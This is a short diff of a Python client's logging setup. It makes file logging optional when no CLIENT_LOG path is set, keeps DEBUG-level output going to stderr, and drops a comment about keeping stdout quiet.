@@ -94,13 +94,14 @@ except ImportError:
     USE_EMBEDDED_CERTS = False
 
 # Configure logging
+handlers = [logging.StreamHandler(sys.stderr)]  # Only stderr, no file logging
+if CLIENT_LOG:
+    handlers.append(logging.FileHandler(CLIENT_LOG))
+
 logging.basicConfig(
     level=logging.DEBUG,  # Changed to DEBUG for better diagnostics
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    handlers=[
-        logging.FileHandler(CLIENT_LOG),
-        logging.StreamHandler(sys.stderr)  # Only stderr, no stdout to stay stealth
-    ]
+    handlers=handlers
 )
 logger = logging.getLogger(__name__)
 
